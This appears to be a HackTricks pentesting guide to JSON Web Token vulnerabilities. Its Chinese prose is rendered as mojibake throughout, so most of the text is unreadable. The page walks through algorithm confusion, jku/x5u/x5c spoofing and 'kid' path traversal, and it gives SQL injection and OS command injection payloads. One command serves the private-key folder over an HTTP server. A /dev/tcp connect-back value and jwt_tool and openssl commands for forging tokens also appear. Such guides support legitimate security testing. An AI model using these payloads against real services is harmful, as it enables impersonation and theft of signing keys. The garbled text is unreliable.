# JWT æ¼æ´ï¼ˆJson Web Tokensï¼‰

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹çš„ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨æˆ‘** [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Bug bounty å°è´´å£«**ï¼š**æ³¨å†Œ** **Intigriti**ï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**æ¼æ´èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾ **$100,000** çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

**æœ¬æ–‡çš„ä¸€éƒ¨åˆ†æ‘˜è‡ªï¼š** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWTs æ¸—é€æµ‹è¯•çš„ä¼Ÿå¤§å·¥å…·ä½œè€…** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **å¿«é€Ÿè·èƒœ**

è¿è¡Œ [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) å¹¶é€‰æ‹© `All Tests!` æ¨¡å¼ï¼Œç­‰å¾…ç»¿è‰²çº¿æ¡
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
å¦‚æœä½ è¿æ°”å¥½ï¼Œè¯¥å·¥å…·ä¼šæ‰¾åˆ°æŸäº›æƒ…å†µï¼Œå…¶ä¸­webåº”ç”¨ç¨‹åºæ£€æŸ¥JWTçš„æ–¹å¼ä¸æ­£ç¡®ï¼š

![](<../.gitbook/assets/image (435).png>)

ç„¶åï¼Œä½ å¯ä»¥åœ¨ä½ çš„ä»£ç†ä¸­æœç´¢è¯·æ±‚ï¼Œæˆ–è€…ä½¿ç”¨jwt_toolè½¬å‚¨è¯¥è¯·æ±‚ä½¿ç”¨çš„JWTï¼š
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### åœ¨ä¸ä¿®æ”¹ä»»ä½•å†…å®¹çš„æƒ…å†µä¸‹ç¯¡æ”¹æ•°æ®

æ‚¨å¯ä»¥åªç¯¡æ”¹æ•°æ®ï¼Œä¿æŒç­¾åä¸å˜ï¼Œå¹¶æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦åœ¨æ£€æŸ¥ç­¾åã€‚å°è¯•å°†æ‚¨çš„ç”¨æˆ·åæ›´æ”¹ä¸ºâ€œadminâ€ã€‚

#### **ä»¤ç‰Œæ˜¯å¦è¢«æ£€æŸ¥ï¼Ÿ**

* å¦‚æœå‡ºç°é”™è¯¯æ¶ˆæ¯ï¼Œåˆ™æ­£åœ¨æ£€æŸ¥ç­¾å - é˜…è¯»å¯èƒ½æ³„éœ²æ•æ„Ÿä¿¡æ¯çš„ä»»ä½•è¯¦ç»†é”™è¯¯ä¿¡æ¯ã€‚
* å¦‚æœè¿”å›çš„é¡µé¢ä¸åŒï¼Œåˆ™æ­£åœ¨æ£€æŸ¥ç­¾åã€‚
* å¦‚æœé¡µé¢ç›¸åŒï¼Œåˆ™æ²¡æœ‰æ£€æŸ¥ç­¾å - æ˜¯æ—¶å€™å¼€å§‹ç¯¡æ”¹æœ‰æ•ˆè½½è·å£°æ˜ï¼Œçœ‹çœ‹æ‚¨èƒ½åšä»€ä¹ˆäº†ï¼

### æ¥æº

æ£€æŸ¥ä»¤ç‰Œåœ¨æ‚¨çš„ä»£ç†è¯·æ±‚å†å²ä¸­çš„èµ·æºä½ç½®ã€‚å®ƒåº”è¯¥åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºï¼Œè€Œä¸æ˜¯å®¢æˆ·ç«¯ã€‚

* å¦‚æœå®ƒé¦–æ¬¡å‡ºç°æ˜¯ä»å®¢æˆ·ç«¯å‘é€çš„ï¼Œåˆ™**å¯†é’¥**å¯è¢«å®¢æˆ·ç«¯ä»£ç è®¿é—® - å¯»æ‰¾å®ƒï¼
* å¦‚æœå®ƒé¦–æ¬¡å‡ºç°æ˜¯ä»æœåŠ¡å™¨å‘é€çš„ï¼Œåˆ™ä¸€åˆ‡æ­£å¸¸ã€‚

### æœ‰æ•ˆæœŸ

æ£€æŸ¥ä»¤ç‰Œæ˜¯å¦æŒç»­è¶…è¿‡24å°æ—¶... ä¹Ÿè®¸å®ƒæ°¸ä¸è¿‡æœŸã€‚å¦‚æœæœ‰â€œexpâ€å­—æ®µï¼Œè¯·æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦æ­£ç¡®å¤„ç†å®ƒã€‚

### æš´åŠ›ç ´è§£HMACå¯†é’¥

[**æŸ¥çœ‹æ­¤é¡µé¢ã€‚**](../generic-methodologies-and-resources/brute-force.md#jwt)

### å°†ç®—æ³•ä¿®æ”¹ä¸ºNoneï¼ˆCVE-2015-9235ï¼‰

å°†ä½¿ç”¨çš„ç®—æ³•è®¾ç½®ä¸ºâ€œNoneâ€ï¼Œå¹¶ç§»é™¤ç­¾åéƒ¨åˆ†ã€‚

ä½¿ç”¨Burpæ‰©å±•åä¸ºâ€œJSON Web Tokenâ€çš„å·¥å…·æ¥å°è¯•è¿™ä¸ªæ¼æ´ï¼Œå¹¶æ›´æ”¹JWTå†…çš„ä¸åŒå€¼ï¼ˆå°†è¯·æ±‚å‘é€åˆ°Repeaterï¼Œåœ¨â€œJSON Web Tokenâ€æ ‡ç­¾ä¸­æ‚¨å¯ä»¥ä¿®æ”¹ä»¤ç‰Œçš„å€¼ã€‚æ‚¨ä¹Ÿå¯ä»¥é€‰æ‹©å°†â€œAlgâ€å­—æ®µçš„å€¼è®¾ç½®ä¸ºâ€œNoneâ€ï¼‰ã€‚

### å°†ç®—æ³•ä»RS256ï¼ˆéå¯¹ç§°ï¼‰æ›´æ”¹ä¸ºHS256ï¼ˆå¯¹ç§°ï¼‰ï¼ˆCVE-2016-5431/CVE-2016-10555ï¼‰

ç®—æ³•HS256ä½¿ç”¨å¯†é’¥æ¥ç­¾åå’ŒéªŒè¯æ¯æ¡æ¶ˆæ¯ã€‚\
ç®—æ³•RS256ä½¿ç”¨ç§é’¥æ¥ç­¾åæ¶ˆæ¯ï¼Œå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡Œè®¤è¯ã€‚

å¦‚æœæ‚¨å°†ç®—æ³•ä»RS256æ›´æ”¹ä¸ºHS256ï¼Œåç«¯ä»£ç å°†ä½¿ç”¨å…¬é’¥ä½œä¸ºå¯†é’¥ï¼Œç„¶åä½¿ç”¨HS256ç®—æ³•æ¥éªŒè¯ç­¾åã€‚

ç„¶åï¼Œä½¿ç”¨å…¬é’¥å¹¶å°†RS256æ›´æ”¹ä¸ºHS256ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæœ‰æ•ˆçš„ç­¾åã€‚æ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥æ£€ç´¢WebæœåŠ¡å™¨çš„è¯ä¹¦ï¼š
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### åœ¨å¤´éƒ¨ä¸­åµŒå…¥æ–°çš„å…¬é’¥

æ”»å‡»è€…åœ¨ä»¤ç‰Œçš„å¤´éƒ¨åµŒå…¥ä¸€ä¸ªæ–°çš„å¯†é’¥ï¼ŒæœåŠ¡å™¨ä½¿ç”¨è¿™ä¸ªæ–°çš„å¯†é’¥æ¥éªŒè¯ç­¾åï¼ˆCVE-2018-0114ï¼‰ã€‚

è¿™å¯ä»¥é€šè¿‡ "JSON Web Tokens" Burp æ‰©å±•æ¥å®Œæˆã€‚\
ï¼ˆå°†è¯·æ±‚å‘é€åˆ° Repeaterï¼Œåœ¨ JSON Web Token æ ‡ç­¾ä¸­é€‰æ‹© "CVE-2018-0114" å¹¶å‘é€è¯·æ±‚ï¼‰ã€‚

### JWKS æ¬ºéª—

å¦‚æœä»¤ç‰Œä½¿ç”¨äº† â€œjkuâ€ å¤´éƒ¨å£°æ˜ï¼Œé‚£ä¹ˆæ£€æŸ¥æä¾›çš„ URLã€‚è¿™åº”è¯¥æŒ‡å‘ä¸€ä¸ªåŒ…å« JWKS æ–‡ä»¶çš„ URLï¼ŒJWKS æ–‡ä»¶ä¸­åŒ…å«ç”¨äºéªŒè¯ä»¤ç‰Œçš„å…¬é’¥ã€‚ç¯¡æ”¹ä»¤ç‰Œï¼Œå°† jku å€¼æŒ‡å‘ä½ å¯ä»¥ç›‘æ§æµé‡çš„ç½‘ç»œæœåŠ¡ã€‚

å¦‚æœä½ å¾—åˆ°äº† HTTP äº¤äº’ï¼Œä½ ç°åœ¨çŸ¥é“æœåŠ¡å™¨æ­£åœ¨å°è¯•ä»ä½ æä¾›çš„ URL åŠ è½½å¯†é’¥ã€‚_ä½¿ç”¨ jwt\_tool çš„ -S æ ‡å¿—ä»¥åŠ -u_ [_http://example.com_](http://example.com) _å‚æ•°æ¥ç”Ÿæˆä¸€å¯¹æ–°çš„å¯†é’¥ï¼Œæ³¨å…¥ä½ æä¾›çš„ URLï¼Œç”ŸæˆåŒ…å«å…¬é’¥çš„ JWKSï¼Œå¹¶ä½¿ç”¨ç§é’¥ç­¾ç½²ä»¤ç‰Œ_

### Kid é—®é¢˜

`kid` æ˜¯ä¸€ä¸ªå¯é€‰çš„å¤´éƒ¨å£°æ˜ï¼Œå®ƒåŒ…å«ä¸€ä¸ªå¯†é’¥æ ‡è¯†ç¬¦ï¼Œå½“ä½ æœ‰å¤šä¸ªå¯†é’¥æ¥ç­¾ç½²ä»¤ç‰Œå¹¶ä¸”éœ€è¦æŸ¥æ‰¾æ­£ç¡®çš„å¯†é’¥æ¥éªŒè¯ç­¾åæ—¶ç‰¹åˆ«æœ‰ç”¨ã€‚

#### "kid" é—®é¢˜ - æ­ç¤ºå¯†é’¥

å¦‚æœåœ¨å¤´éƒ¨ä½¿ç”¨äº† "kid" å£°æ˜ï¼Œæ£€æŸ¥è¯¥æ–‡ä»¶æˆ–å…¶å˜ä½“æ˜¯å¦å­˜åœ¨äºç½‘ç«™ç›®å½•ä¸­ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ `"kid":"key/12345"`ï¼Œé‚£ä¹ˆåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸­æŸ¥æ‰¾ _/key/12345_ å’Œ _/key/12345.pem_ã€‚

#### "kid" é—®é¢˜ - è·¯å¾„éå†

å¦‚æœåœ¨å¤´éƒ¨ä½¿ç”¨äº† "kid" å£°æ˜ï¼Œæ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸åŒæ–‡ä»¶ã€‚é€‰æ‹©ä¸€ä¸ªä½ å¯èƒ½èƒ½é¢„æµ‹å†…å®¹çš„æ–‡ä»¶ï¼Œæˆ–è€…å°è¯•ä½¿ç”¨ `"kid":"/dev/tcp/ä½ çš„IP/ä½ çš„ç«¯å£"` æ¥æµ‹è¯•è¿æ¥æ€§ï¼Œç”šè‡³æ˜¯ä¸€äº› **SSRF** è½½è·...\
_ä½¿ç”¨ jwt\_tool çš„ -T æ ‡å¿—æ¥ç¯¡æ”¹ JWT å¹¶æ›´æ”¹ kid å£°æ˜çš„å€¼ï¼Œç„¶åé€‰æ‹©ä¿æŒåŸå§‹ç­¾å_
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
ä½¿ç”¨ä¸»æœºå†…å·²çŸ¥å†…å®¹çš„æ–‡ä»¶ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä¼ªé€ æœ‰æ•ˆçš„JWTã€‚ä¾‹å¦‚ï¼Œåœ¨linuxç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶`/proc/sys/kernel/randomize_va_space`çš„å€¼è®¾ç½®ä¸º**2**ã€‚å› æ­¤ï¼Œå°†è¯¥**è·¯å¾„**æ”¾å…¥"**kid**"å‚æ•°ä¸­ï¼Œå¹¶ä½¿ç”¨"**2**"ä½œä¸º**å¯¹ç§°å¯†ç **æ¥ç”ŸæˆJWTï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿç”Ÿæˆä¸€ä¸ªæœ‰æ•ˆçš„æ–°JWTã€‚

#### "kid"é—®é¢˜ - SQLæ³¨å…¥

åœ¨ä¸€ä¸ªåœºæ™¯ä¸­ï¼Œ"kid"çš„å†…å®¹è¢«ç”¨æ¥ä»æ•°æ®åº“ä¸­æ£€ç´¢å¯†ç ï¼Œæ‚¨å¯ä»¥å°†"kid"å‚æ•°å†…çš„æœ‰æ•ˆè½½è·æ›´æ”¹ä¸ºï¼š`non-existent-index' UNION SELECT 'ATTACKER';-- -`ï¼Œç„¶åä½¿ç”¨å¯†é’¥`ATTACKER`ç­¾ç½²JWTã€‚

#### "kid"é—®é¢˜ - æ“ä½œç³»ç»Ÿæ³¨å…¥

åœ¨ä¸€ä¸ªåœºæ™¯ä¸­ï¼Œ"kid"å‚æ•°åŒ…å«å¯†é’¥æ–‡ä»¶çš„è·¯å¾„ï¼Œå¹¶ä¸”è¿™ä¸ªè·¯å¾„æ­£åœ¨**æ‰§è¡Œçš„å‘½ä»¤ä¸­**è¢«ä½¿ç”¨ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æœ‰æ•ˆè½½è·è·å¾—RCEå¹¶æš´éœ²ç§é’¥ï¼š`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### æ‚é¡¹æ”»å‡»

ä»¥ä¸‹æ˜¯å·²çŸ¥çš„å¼±ç‚¹ï¼Œåº”è¯¥è¿›è¡Œæµ‹è¯•ã€‚

**è·¨æœåŠ¡ä¸­ç»§æ”»å‡»**

ä¸€äº›Webåº”ç”¨ç¨‹åºä½¿ç”¨å¯ä¿¡çš„JWTâ€˜æœåŠ¡â€™æ¥ä¸ºå®ƒä»¬ç”Ÿæˆå’Œç®¡ç†ä»¤ç‰Œã€‚åœ¨è¿‡å»ï¼Œæœ‰äº›æƒ…å†µå‘ç”Ÿäº†ï¼Œä¸ºJWTæœåŠ¡çš„ä¸€ä¸ªå®¢æˆ·ç«¯ç”Ÿæˆçš„ä»¤ç‰Œå®é™…ä¸Šå¯ä»¥è¢«JWTæœåŠ¡çš„å¦ä¸€ä¸ªå®¢æˆ·ç«¯æ¥å—ã€‚\
å¦‚æœæ‚¨è§‚å¯Ÿåˆ°JWTé€šè¿‡ç¬¬ä¸‰æ–¹æœåŠ¡å‘è¡Œæˆ–æ›´æ–°ï¼Œé‚£ä¹ˆå€¼å¾—è¯†åˆ«æ‚¨æ˜¯å¦å¯ä»¥åœ¨è¯¥æœåŠ¡çš„å¦ä¸€ä¸ªå®¢æˆ·ç«¯ä¸Šä½¿ç”¨ç›¸åŒçš„ç”¨æˆ·å/ç”µå­é‚®ä»¶æ³¨å†Œè´¦æˆ·ã€‚å¦‚æœå¯ä»¥ï¼Œå°è¯•å–å‡ºè¯¥ä»¤ç‰Œå¹¶åœ¨è¯·æ±‚ä¸­é‡æ”¾å®ƒåˆ°æ‚¨çš„ç›®æ ‡ã€‚å®ƒè¢«æ¥å—äº†å—ï¼Ÿ

* å¦‚æœæ‚¨çš„ä»¤ç‰Œè¢«æ¥å—ï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½æœ‰ä¸€ä¸ªå…³é”®é—®é¢˜ï¼Œå…è®¸æ‚¨å†’å……ä»»ä½•ç”¨æˆ·çš„è´¦æˆ·ã€‚ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨åœ¨ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºä¸Šæ³¨å†Œï¼Œæ‚¨å¯èƒ½éœ€è¦å¯»æ±‚æ›´å¹¿æ³›çš„æµ‹è¯•æƒé™ï¼Œä»¥é˜²å®ƒè¿›å…¥æ³•å¾‹ç°è‰²åœ°å¸¦ï¼

**æ˜¯å¦æ£€æŸ¥expï¼Ÿ**

â€œexpâ€æœ‰æ•ˆè½½è·å£°æ˜ç”¨äºæ£€æŸ¥ä»¤ç‰Œçš„è¿‡æœŸæ—¶é—´ã€‚ç”±äºJWTé€šå¸¸åœ¨æ²¡æœ‰ä¼šè¯ä¿¡æ¯çš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œå› æ­¤å®ƒä»¬ç¡®å®éœ€è¦å°å¿ƒå¤„ç† - åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œæ•è·å¹¶é‡æ”¾å…¶ä»–äººçš„JWTå°†å…è®¸æ‚¨ä¼ªè£…æˆè¯¥ç”¨æˆ·ã€‚\
JWTé‡æ”¾æ”»å‡»çš„ä¸€ä¸ªç¼“è§£æªæ–½ï¼ˆJWT RFCå»ºè®®ï¼‰æ˜¯ä½¿ç”¨â€œexpâ€å£°æ˜ä¸ºä»¤ç‰Œè®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´ã€‚åœ¨åº”ç”¨ç¨‹åºä¸­è®¾ç½®ç›¸å…³æ£€æŸ¥ä¹Ÿå¾ˆé‡è¦ï¼Œä»¥ç¡®ä¿å¤„ç†æ­¤å€¼å¹¶åœ¨ä»¤ç‰Œè¿‡æœŸæ—¶æ‹’ç»å®ƒã€‚å¦‚æœä»¤ç‰ŒåŒ…å«â€œexpâ€å£°æ˜ï¼Œå¹¶ä¸”æµ‹è¯•æ—¶é—´é™åˆ¶å…è®¸ - å°è¯•å­˜å‚¨ä»¤ç‰Œå¹¶åœ¨è¿‡æœŸæ—¶é—´è¿‡åé‡æ”¾å®ƒã€‚_ä½¿ç”¨jwt\_toolçš„-Ræ ‡å¿—æ¥è¯»å–ä»¤ç‰Œçš„å†…å®¹ï¼Œå…¶ä¸­åŒ…æ‹¬æ—¶é—´æˆ³è§£æå’Œè¿‡æœŸæ£€æŸ¥ï¼ˆæ—¶é—´æˆ³ä¸ºUTCï¼‰_

* å¦‚æœä»¤ç‰Œåœ¨åº”ç”¨ç¨‹åºä¸­ä»ç„¶æœ‰æ•ˆï¼Œé‚£ä¹ˆè¿™å¯èƒ½æ˜¯ä¸€ä¸ªå®‰å…¨é£é™©ï¼Œå› ä¸ºä»¤ç‰Œå¯èƒ½æ°¸è¿œä¸ä¼šè¿‡æœŸã€‚

### x5uå’Œjku

#### jku

jkuä»£è¡¨**JWKé›†åˆURL**ã€‚\
å¦‚æœä»¤ç‰Œä½¿ç”¨â€œ**jku**â€**å¤´éƒ¨**å£°æ˜ï¼Œé‚£ä¹ˆ**æ£€æŸ¥æä¾›çš„URL**ã€‚è¿™åº”è¯¥æŒ‡å‘ä¸€ä¸ªåŒ…å«JWKSæ–‡ä»¶çš„URLï¼Œè¯¥æ–‡ä»¶æŒæœ‰ç”¨äºéªŒè¯ä»¤ç‰Œçš„å…¬é’¥ã€‚ç¯¡æ”¹ä»¤ç‰Œï¼Œå°†jkuå€¼æŒ‡å‘æ‚¨å¯ä»¥ç›‘æ§æµé‡çš„WebæœåŠ¡ã€‚

é¦–å…ˆæ‚¨éœ€è¦åˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ–°çš„ç§é’¥å’Œå…¬é’¥çš„æ–°è¯ä¹¦
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
```markdown
ç„¶åæ‚¨å¯ä»¥ä½¿ç”¨ä¾‹å¦‚ [**jwt.io**](https://jwt.io) æ¥ä½¿ç”¨**åˆ›å»ºçš„å…¬é’¥å’Œç§é’¥åˆ›å»ºæ–°çš„JWTï¼Œå¹¶å°†å‚æ•°jkuæŒ‡å‘åˆ›å»ºçš„è¯ä¹¦ã€‚** ä¸ºäº†åˆ›å»ºæœ‰æ•ˆçš„jkuè¯ä¹¦ï¼Œæ‚¨å¯ä»¥ä¸‹è½½åŸå§‹è¯ä¹¦å¹¶æ›´æ”¹æ‰€éœ€çš„å‚æ•°ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ä»å…¬å…±è¯ä¹¦è·å–å‚æ•° "e" å’Œ "n"ï¼š
```
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URLã€‚ä¸€ä¸ªæŒ‡å‘ä¸€ç»„ä»¥ PEM å½¢å¼ç¼–ç çš„ X.509ï¼ˆè¯ä¹¦æ ¼å¼æ ‡å‡†ï¼‰å…¬å…±è¯ä¹¦çš„ URIã€‚è¯¥ç»„ä¸­çš„ç¬¬ä¸€ä¸ªè¯ä¹¦å¿…é¡»æ˜¯ç”¨æ¥ç­¾ç½²è¿™ä¸ª JWT çš„è¯ä¹¦ã€‚éšåçš„è¯ä¹¦æ¯ä¸ªéƒ½ç­¾ç½²å‰ä¸€ä¸ªï¼Œä»è€Œå®Œæˆè¯ä¹¦é“¾ã€‚X.509 åœ¨ RFC 52807 ä¸­å®šä¹‰ã€‚ä¼ è¾“è¯ä¹¦æ—¶éœ€è¦ä¼ è¾“å®‰å…¨ä¿æŠ¤ã€‚

å°è¯•**å°†æ­¤å¤´éƒ¨æ›´æ”¹ä¸ºæ‚¨æ§åˆ¶ä¸‹çš„ URL**ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦æ”¶åˆ°ä»»ä½•è¯·æ±‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨**å¯ä»¥ç¯¡æ”¹ JWT**ã€‚

è¦ä¼ªé€ ä¸€ä¸ªç”±æ‚¨æ§åˆ¶çš„è¯ä¹¦ç­¾åçš„æ–°ä»¤ç‰Œï¼Œæ‚¨éœ€è¦åˆ›å»ºè¯ä¹¦å¹¶æå–å…¬é’¥å’Œç§é’¥ï¼š
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
ç„¶åæ‚¨å¯ä»¥ä½¿ç”¨ä¾‹å¦‚ [**jwt.io**](https://jwt.io) æ¥ä½¿ç”¨**åˆ›å»ºçš„å…¬é’¥å’Œç§é’¥åˆ›å»ºæ–°çš„ JWTï¼Œå¹¶å°† x5u å‚æ•°æŒ‡å‘åˆ›å»ºçš„ .crt è¯ä¹¦ã€‚**

![](<../.gitbook/assets/image (439).png>)

æ‚¨è¿˜å¯ä»¥åˆ©ç”¨è¿™ä¸¤ä¸ªæ¼æ´**è¿›è¡Œ SSRF æ”»å‡»**ã€‚

#### x5c

æ­¤å‚æ•°å¯èƒ½åŒ…å«**ä»¥ base64 ç¼–ç çš„è¯ä¹¦**ï¼š

![](<../.gitbook/assets/image (440).png>)

å¦‚æœæ”»å‡»è€…**ç”Ÿæˆè‡ªç­¾åè¯ä¹¦**ï¼Œå¹¶ä½¿ç”¨ç›¸åº”çš„ç§é’¥åˆ›å»ºä¼ªé€ çš„ä»¤ç‰Œï¼Œå¹¶æ›¿æ¢ "x5c" å‚æ•°çš„å€¼ä¸ºæ–°ç”Ÿæˆçš„è¯ä¹¦ï¼Œå¹¶ä¿®æ”¹å…¶ä»–å‚æ•°ï¼Œå³ nã€e å’Œ x5tï¼Œé‚£ä¹ˆå®è´¨ä¸Šä¼ªé€ çš„ä»¤ç‰Œå°†è¢«æœåŠ¡å™¨æ¥å—ã€‚
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### åµŒå…¥å¼å…¬é’¥ (CVE-2018-0114)

å¦‚æœJWTåƒä»¥ä¸‹åœºæ™¯é‚£æ ·åµŒå…¥äº†ä¸€ä¸ªå…¬é’¥ï¼š

![](<../.gitbook/assets/image (438).png>)

ä½¿ç”¨ä»¥ä¸‹nodejsè„šæœ¬å¯ä»¥ä»é‚£äº›æ•°æ®ç”Ÿæˆä¸€ä¸ªå…¬é’¥ï¼š
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
å¯ä»¥ç”Ÿæˆæ–°çš„ç§é’¥/å…¬é’¥ï¼Œå°†æ–°çš„å…¬é’¥åµŒå…¥ä»¤ç‰Œä¸­ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥ç”Ÿæˆæ–°çš„ç­¾åï¼š
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹nodejsè„šæœ¬è·å–â€œnâ€å’Œâ€œeâ€ï¼š
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
### JTI (JWT ID)

JTIï¼ˆJWT IDï¼‰å£°æ˜æä¾›äº†JWTä»¤ç‰Œçš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚å®ƒå¯ä»¥ç”¨æ¥é˜²æ­¢ä»¤ç‰Œè¢«é‡æ”¾ã€‚\
ç„¶è€Œï¼Œæƒ³è±¡ä¸€ç§æƒ…å†µï¼ŒIDçš„æœ€å¤§é•¿åº¦ä¸º4ï¼ˆ0001-9999ï¼‰ã€‚è¯·æ±‚0001å’Œ10001å°†ä½¿ç”¨ç›¸åŒçš„IDã€‚å› æ­¤ï¼Œå¦‚æœåç«¯åœ¨æ¯ä¸ªè¯·æ±‚ä¸Šé€’å¢IDï¼Œä½ å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥**é‡æ”¾è¯·æ±‚**ï¼ˆéœ€è¦åœ¨æ¯æ¬¡æˆåŠŸé‡æ”¾ä¹‹é—´å‘é€10000ä¸ªè¯·æ±‚ï¼‰ã€‚

### JWT æ³¨å†Œå£°æ˜

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### å·¥å…·

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
